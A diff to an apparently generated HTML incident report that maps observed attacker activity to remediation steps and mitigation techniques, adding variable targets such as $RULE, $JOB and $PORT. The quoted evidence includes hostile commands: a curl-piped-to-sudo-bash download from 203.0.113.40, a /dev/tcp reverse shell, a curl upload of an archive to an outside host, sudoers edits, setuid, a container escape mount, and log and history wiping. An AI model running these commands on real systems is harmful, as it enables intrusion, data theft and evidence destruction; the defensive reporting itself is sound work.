@@ -489,7 +489,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Privileged access obtained</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>A principal was given a privileged role or permission, or a route to root on a host was opened. Treat what it governs as under attacker control until reviewed.</p>
-<div class="pair"><span class="label">targets</span><span class="value">file /etc/sudoers.d/svc; file /tmp/tool ($F); mount /:/host</span></div>
+<div class="pair"><span class="label">targets</span><span class="value">file /etc/sudoers.d/svc; rule $RULE; file /tmp/tool ($F); mount /:/host</span></div>
 <div class="pair"><span class="label">what</span><span class="value">SudoersModification: echo &#34;$RULE&#34; &gt;&gt; /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)</span></div>
 <div class="pair"><span class="label"></span><span class="value">SetuidBit: chmod u&#43;s &#34;$F&#34; (20261022_091000_step03_privesc.sh:4)</span></div>
 <div class="pair"><span class="label"></span><span class="value">ContainerEscape: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)</span></div>
@@ -510,7 +510,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Persistence established</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>A way back in was created: a credential, an account, a key, a scheduled job, a service or a start-up entry. Access survives a password reset.</p>
-<div class="pair"><span class="label">targets</span><span class="value">unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc</span></div>
+<div class="pair"><span class="label">targets</span><span class="value">runs $JOB; unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc; adds $LINE</span></div>
 <div class="pair"><span class="label">what</span><span class="value">ScheduledJobCreation: (crontab -l; echo &#34;$JOB&#34;) | crontab - (20261022_091500_step04_persist.sh:3)</span></div>
 <div class="pair"><span class="label"></span><span class="value">ScheduledJobCreation: crontab - (audit_20261022_093500.jsonl)</span></div>
 <div class="pair"><span class="label"></span><span class="value">SystemdUnitCreation: cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)</span></div>
@@ -539,7 +539,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Outside hosts contacted</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Files or commands were fetched from, or a channel was opened to, hosts outside the environment. Affected: 198.51.100.7, 203.0.113.40, 203.0.113.41.</p>
-<div class="pair"><span class="label">targets</span><span class="value">url http://203.0.113.40/s.sh; host 203.0.113.41 ($H)</span></div>
+<div class="pair"><span class="label">targets</span><span class="value">url http://203.0.113.40/s.sh; host 203.0.113.41 ($H); port $PORT</span></div>
 <div class="pair"><span class="label">what</span><span class="value">ShellDownloadAndExecute: sudo bash -c &#34;$(curl -fsSL http://203.0.113.40/s.sh)&#34; (20261022_092500_step06_stage.sh:4)</span></div>
 <div class="pair"><span class="label"></span><span class="value">ReverseShell: os.system(&#34;exec 3&lt;&gt;/dev/tcp/$H/$PORT&#34;) (20261022_093000_step07_channel.py:8)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">ShellDownloadAndExecute, ReverseShell</span></div>
@@ -572,6 +572,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="mark medium">[!]</td><td class="cell">Traces hidden</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Files or history were removed or disguised. What is left on the host is incomplete.</p>
+<div class="pair"><span class="label">targets</span><span class="value">file $F</span></div>
 <div class="pair"><span class="label">what</span><span class="value">HistoryClearing: history -c (20261022_092000_step05_evade.sh:7)</span></div>
 <div class="pair"><span class="label"></span><span class="value">Timestomp: touch -r /bin/ls &#34;$F&#34; (20261022_092000_step05_evade.sh:8)</span></div>
 <div class="pair"><span class="label">basis</span><span class="value">HistoryClearing, Timestomp</span></div>
@@ -627,7 +628,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Remove persistence</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Delete the scheduled jobs, services, accounts, keys and start-up entries that were created, and the files they start.</p>
-<div class="pair"><span class="label">targets</span><span class="value">unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc</span></div>
+<div class="pair"><span class="label">targets</span><span class="value">runs $JOB; unit sync.service; account svc; file ~/.ssh/authorized_keys; file ~/.bashrc; adds $LINE</span></div>
 <div class="pair"><span class="label">what</span><span class="value">ScheduledJobCreation: (crontab -l; echo &#34;$JOB&#34;) | crontab - (20261022_091500_step04_persist.sh:3)</span></div>
 <div class="pair"><span class="label"></span><span class="value">ScheduledJobCreation: crontab - (audit_20261022_093500.jsonl)</span></div>
 <div class="pair"><span class="label"></span><span class="value">SystemdUnitCreation: cp sync.service /etc/systemd/system/sync.service (20261022_091500_step04_persist.sh:5)</span></div>
@@ -640,7 +641,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Undo privilege changes on hosts</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Put sudo rules, file modes and container settings back to their approved state, and treat the host as held at root until rebuilt.</p>
-<div class="pair"><span class="label">targets</span><span class="value">file /etc/sudoers.d/svc; file /tmp/tool ($F); mount /:/host</span></div>
+<div class="pair"><span class="label">targets</span><span class="value">file /etc/sudoers.d/svc; rule $RULE; file /tmp/tool ($F); mount /:/host</span></div>
 <div class="pair"><span class="label">what</span><span class="value">SudoersModification: echo &#34;$RULE&#34; &gt;&gt; /etc/sudoers.d/svc (20261022_091000_step03_privesc.sh:5)</span></div>
 <div class="pair"><span class="label"></span><span class="value">SetuidBit: chmod u&#43;s &#34;$F&#34; (20261022_091000_step03_privesc.sh:4)</span></div>
 <div class="pair"><span class="label"></span><span class="value">ContainerEscape: docker run -v /:/host alpine ls /host (20261022_091000_step03_privesc.sh:6)</span></div>
@@ -659,7 +660,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">Block and hunt the infrastructure</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Block the addresses and domains in the findings, and search proxy, DNS and firewall logs for other hosts that reached them.</p>
-<div class="pair"><span class="label">targets</span><span class="value">url http://203.0.113.40/s.sh; url https://files.example.net/up; file out.tgz; host 203.0.113.41 ($H)</span></div>
+<div class="pair"><span class="label">targets</span><span class="value">url http://203.0.113.40/s.sh; url https://files.example.net/up; file out.tgz; host 203.0.113.41 ($H); port $PORT</span></div>
 <div class="pair"><span class="label">what</span><span class="value">ShellDownloadAndExecute: sudo bash -c &#34;$(curl -fsSL http://203.0.113.40/s.sh)&#34; (20261022_092500_step06_stage.sh:4)</span></div>
 <div class="pair"><span class="label"></span><span class="value">FileUpload: curl -T out.tgz https://files.example.net/up (20261022_092500_step06_stage.sh:8)</span></div>
 <div class="pair"><span class="label"></span><span class="value">ReverseShell: os.system(&#34;exec 3&lt;&gt;/dev/tcp/$H/$PORT&#34;) (20261022_093000_step07_channel.py:8)</span></div>
@@ -685,7 +686,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="mark medium">[!]</td><td class="cell">Recover the missing logs</td></tr>
 <tr class="detail"><td colspan="2"><div class="under">
 <p>Treat local logs as incomplete, and recover the period from a central collector or a backup.</p>
-<div class="pair"><span class="label">targets</span><span class="value">log /var/log/auth.log; setting HISTFILE</span></div>
+<div class="pair"><span class="label">targets</span><span class="value">log /var/log/auth.log; setting HISTFILE; file $F</span></div>
 <div class="pair"><span class="label">what</span><span class="value">LogDeletion: rm -f /var/log/auth.log (20261022_092000_step05_evade.sh:6)</span></div>
 <div class="pair"><span class="label"></span><span class="value">HistoryClearing: history -c (20261022_092000_step05_evade.sh:7)</span></div>
 <div class="pair"><span class="label"></span><span class="value">HistoryDisabling: unset HISTFILE (20261022_092000_step05_evade.sh:3)</span></div>
@@ -727,6 +728,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="detail"><td colspan="3"><div class="under">
 <p>User Account Management involves implementing and enforcing policies for the lifecycle of user accounts, including creation, modification, and deactivation.</p>
 <div class="pair"><span class="label">for</span><span class="value">FileUpload: url https://files.example.net/up, file out.tgz</span></div>
+<div class="pair"><span class="label"></span><span class="value">ScheduledJobCreation: runs $JOB</span></div>
 <div class="pair"><span class="label"></span><span class="value">SshKeyPersistence: file ~/.ssh/authorized_keys</span></div>
 <div class="pair"><span class="label"></span><span class="value">SystemdUnitCreation: unit sync.service</span></div>
 <div class="pair"><span class="label"></span><span class="value">SecurityToolDisabling: service auditd</span></div>
@@ -735,12 +737,12 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Restricting file and directory permissions involves setting access controls at the file system level to limit which users, groups, or processes can read, write, or execute files.</p>
 <div class="pair"><span class="label">for</span><span class="value">FileUpload: url https://files.example.net/up, file out.tgz</span></div>
+<div class="pair"><span class="label"></span><span class="value">ScheduledJobCreation: runs $JOB</span></div>
 <div class="pair"><span class="label"></span><span class="value">SshKeyPersistence: file ~/.ssh/authorized_keys</span></div>
 <div class="pair"><span class="label"></span><span class="value">SystemdUnitCreation: unit sync.service</span></div>
-<div class="pair"><span class="label"></span><span class="value">ShellProfilePersistence: file ~/.bashrc</span></div>
-<div class="pair"><span class="label"></span><span class="value">SudoersModification: file /etc/sudoers.d/svc</span></div>
-<div class="pair"><span class="label"></span><span class="value">CredentialFileRead: file ~/.aws/credentials</span></div>
-<div class="pair"><span class="label"></span><span class="value">and 3 more in report.json</span></div>
+<div class="pair"><span class="label"></span><span class="value">ShellProfilePersistence: file ~/.bashrc, adds $LINE</span></div>
+<div class="pair"><span class="label"></span><span class="value">SudoersModification: file /etc/sudoers.d/svc, rule $RULE</span></div>
+<div class="pair"><span class="label"></span><span class="value">and 4 more in report.json</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1024 Restrict Registry Permissions</td><td class="cell">T1685, T1686</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
@@ -751,9 +753,10 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Privileged Account Management focuses on implementing policies, controls, and tools to securely manage privileged accounts (e.g., SYSTEM, root, or administrative accounts).</p>
 <div class="pair"><span class="label">for</span><span class="value">ShadowFileRead: file /etc/shadow</span></div>
+<div class="pair"><span class="label"></span><span class="value">ScheduledJobCreation: runs $JOB</span></div>
 <div class="pair"><span class="label"></span><span class="value">AccountCreation: account svc</span></div>
 <div class="pair"><span class="label"></span><span class="value">SystemdUnitCreation: unit sync.service</span></div>
-<div class="pair"><span class="label"></span><span class="value">SudoersModification: file /etc/sudoers.d/svc</span></div>
+<div class="pair"><span class="label"></span><span class="value">SudoersModification: file /etc/sudoers.d/svc, rule $RULE</span></div>
 <div class="pair"><span class="label"></span><span class="value">ContainerEscape: mount /:/host</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1027 Password Policies</td><td class="cell">T1003.008, T1552.001, T1552.004</td></tr>
@@ -766,8 +769,9 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1028 Operating System Configuration</td><td class="cell">T1053.002, T1548.001, T1548.003, T1552.003, T1690</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Operating System Configuration involves adjusting system settings and hardening the default configurations of an operating system (OS) to mitigate adversary exploitation and prevent abuse of system functionality.</p>
-<div class="pair"><span class="label">for</span><span class="value">SetuidBit: file /tmp/tool ($F)</span></div>
-<div class="pair"><span class="label"></span><span class="value">SudoersModification: file /etc/sudoers.d/svc</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ScheduledJobCreation: runs $JOB</span></div>
+<div class="pair"><span class="label"></span><span class="value">SetuidBit: file /tmp/tool ($F)</span></div>
+<div class="pair"><span class="label"></span><span class="value">SudoersModification: file /etc/sudoers.d/svc, rule $RULE</span></div>
 <div class="pair"><span class="label"></span><span class="value">ShellHistoryRead: file ~/.bash_history</span></div>
 <div class="pair"><span class="label"></span><span class="value">HistoryDisabling: setting HISTFILE</span></div>
 </div></td></tr>
@@ -780,13 +784,13 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Network segmentation involves dividing a network into smaller, isolated segments to control and limit the flow of traffic between devices, systems, and applications.</p>
 <div class="pair"><span class="label">for</span><span class="value">FileUpload: url https://files.example.net/up, file out.tgz</span></div>
-<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H)</span></div>
+<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H), port $PORT</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1031 Network Intrusion Prevention</td><td class="cell">T1048, T1095, T1105</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Use intrusion detection signatures to block traffic at network boundaries.</p>
 <div class="pair"><span class="label">for</span><span class="value">FileUpload: url https://files.example.net/up, file out.tgz</span></div>
-<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H)</span></div>
+<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H), port $PORT</span></div>
 <div class="pair"><span class="label"></span><span class="value">ShellDownloadAndExecute: url http://203.0.113.40/s.sh</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1032 Multi-factor Authentication</td><td class="cell">T1136.001</td></tr>
@@ -808,7 +812,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Employ network appliances and endpoint software to filter ingress, egress, and lateral network traffic.</p>
 <div class="pair"><span class="label">for</span><span class="value">FileUpload: url https://files.example.net/up, file out.tgz</span></div>
-<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H)</span></div>
+<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H), port $PORT</span></div>
 <div class="pair"><span class="label"></span><span class="value">ShellDownloadAndExecute: url http://203.0.113.40/s.sh</span></div>
 <div class="pair"><span class="label"></span><span class="value">CloudMetadataAccess: url http://169.254.169.254/latest/meta-data/</span></div>
 </div></td></tr>
@@ -816,7 +820,7 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Prevent the execution of unauthorized or malicious code on systems by implementing application control, script blocking, and other execution prevention mechanisms.</p>
 <div class="pair"><span class="label">for</span><span class="value">ShellDownloadAndExecute: url http://203.0.113.40/s.sh</span></div>
-<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H)</span></div>
+<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H), port $PORT</span></div>
 <div class="pair"><span class="label"></span><span class="value">ContainerEscape: mount /:/host</span></div>
 <div class="pair"><span class="label"></span><span class="value">SecurityToolDisabling: service auditd</span></div>
 </div></td></tr>
@@ -842,7 +846,8 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1047 Audit</td><td class="cell">T1053.002, T1053.003, T1095, T1552.001, T1552.004, T1560.001, T1685, T1685.004, T1686</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Auditing is the process of recording activity and systematically reviewing and analyzing the activity and system configurations.</p>
-<div class="pair"><span class="label">for</span><span class="value">ReverseShell: host 203.0.113.41 ($H)</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ScheduledJobCreation: runs $JOB</span></div>
+<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H), port $PORT</span></div>
 <div class="pair"><span class="label"></span><span class="value">CredentialFileRead: file ~/.aws/credentials</span></div>
 <div class="pair"><span class="label"></span><span class="value">PrivateKeyRead: file ~/.ssh/id_rsa</span></div>
 <div class="pair"><span class="label"></span><span class="value">ArchiveCreation: archive out.tgz</span></div>
@@ -877,14 +882,14 @@ footer code { font-family: ui-monospace, "Cascadia Mono", Consolas, monospace; }
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Prevent abuse of library loading mechanisms in the operating system and software to load untrusted code by configuring appropriate library loading mechanisms and investigating potential vulnerable software.</p>
 <div class="pair"><span class="label">for</span><span class="value">ShellDownloadAndExecute: url http://203.0.113.40/s.sh</span></div>
-<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H)</span></div>
+<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H), port $PORT</span></div>
 <div class="pair"><span class="label"></span><span class="value">ShadowFileRead: file /etc/shadow</span></div>
-<div class="pair"><span class="label"></span><span class="value">ShellProfilePersistence: file ~/.bashrc</span></div>
+<div class="pair"><span class="label"></span><span class="value">ShellProfilePersistence: file ~/.bashrc, adds $LINE</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">AML.M0013 Code Signing</td><td class="cell">AML.T0142</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.</p>
-<div class="pair"><span class="label">for</span><span class="value">ShellProfilePersistence: file ~/.bashrc</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ShellProfilePersistence: file ~/.bashrc, adds $LINE</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">AML.M0043 AI Agent External Resource Lifecycle Management</td><td class="cell">AML.T0072, AML.T0125</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
